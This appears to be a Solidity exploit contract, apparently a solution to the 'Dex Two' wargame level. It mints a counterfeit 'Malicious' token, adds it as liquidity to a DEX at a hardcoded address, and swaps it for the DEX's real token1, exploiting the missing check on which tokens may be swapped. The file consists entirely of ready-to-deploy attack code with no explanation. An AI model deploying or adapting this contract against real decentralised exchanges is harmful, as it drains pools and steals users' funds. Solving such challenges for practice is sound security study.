// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

import '@openzeppelin/contracts@3.4.2/token/ERC20/ERC20.sol';

interface IDexTwo {
    function token1() external returns (address);
    function swap(address, address, uint256) external;
    function add_liquidity(address, uint256) external;
}

contract DexTwoHack is ERC20 {
    IDexTwo public dexTwo = IDexTwo(0xcEb06F673A7fD406EF26287e44a8a833f19597Bf);

    constructor() public ERC20("Malicious", "MAL") {
        _mint(address(this), 200e18);
    }

    function swap() public {
        this.approve(address(dexTwo), balanceOf(address(this)));
        dexTwo.add_liquidity(address(this), 100e18);
        dexTwo.swap(address(this), dexTwo.token1(), 100e18);
    }
}
